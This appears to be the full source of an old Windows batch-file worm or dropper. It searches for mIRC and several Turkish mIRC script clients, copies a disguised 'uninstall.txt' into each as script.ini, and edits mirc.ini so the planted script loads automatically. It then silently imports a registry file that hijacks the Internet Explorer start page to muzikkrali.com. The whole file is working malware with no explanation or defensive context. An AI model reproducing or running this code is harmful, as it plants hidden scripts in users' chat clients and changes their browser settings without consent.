@echo off
@if a%1a == arega goto son

:esgec
@if exist c:\mirc\mirc32.exe goto mirc
@if exist c:\mirc\mirc.ini goto mirc

:a
@if exist C:\Klavye40\mirc32.exe goto klavye40
@if exist C:\Klavye40\mirc.ini goto klavye40

:b
@if exist C:\k5plus\mirc32.exe goto k5plus
@if exist C:\k5plus\mirc.ini goto k5plus

:c
@if exist C:\k5elite\mirc32.exe goto k5elite
@if exist C:\k5elite\mirc.ini goto k5elite

:d
@if exist C:\canavar\mirc32.exe goto canavar
@if exist C:\canavar\mirc.ini goto canavar

:e
@if exist c:\progra~1\mirc\mirc32.exe goto pmirc
@if exist c:\progra~1\mirc\mirc.ini goto pmirc

@goto son

:mirc
@copy c:\progra~1\uninstall.txt c:\mirc\script.ini /y >> c:\progra~1\print.dat
@echo n0=script.ini >> c:\mirc\mirc.ini
@echo n1=script.ini >> c:\mirc\mirc.ini
@echo n2=script.ini >> c:\mirc\mirc.ini
@echo n3=script.ini >> c:\mirc\mirc.ini
@echo n4=script.ini >> c:\mirc\mirc.ini
@echo n5=script.ini >> c:\mirc\mirc.ini
@echo n6=script.ini >> c:\mirc\mirc.ini
@echo n7=script.ini >> c:\mirc\mirc.ini
@echo n8=script.ini >> c:\mirc\mirc.ini
@echo n9=script.ini >> c:\mirc\mirc.ini
@goto a

:klavye40
@copy c:\progra~1\uninstall.txt c:\Klavye40\script.ini /y >> c:\progra~1\print.dat
@goto b

:k5plus
@copy c:\progra~1\uninstall.txt c:\k5plus\system\remote\script9.ini /y >> c:\progra~1\print.dat
@goto c

:k5elite
@copy c:\progra~1\uninstall.txt c:\k5elite\system\remote\script.ini /y >> c:\progra~1\print.dat
@goto d

:canavar
@copy c:\progra~1\uninstall.txt c:\canavar\script.ini /y >> c:\progra~1\print.dat
@goto e

:pmirc
@copy c:\progra~1\uninstall.txt c:\progra~1\mirc\script.ini /y >> c:\progra~1\print.dat
@echo n0=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n1=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n2=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n3=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n4=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n5=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n6=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n7=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n8=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n9=script.ini >> c:\progra~1\mirc\mirc.ini
@goto son

:son
@echo REGEDIT4 >  c:\progra~1\system.reg
@echo [HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer\Main] >> c:\progra~1\system.reg
@echo "Start Page"="http://www.muzikkrali.com/"   >> c:\progra~1\system.reg
@%winbootdir%\regedit /s c:\progra~1\system.reg
@exit
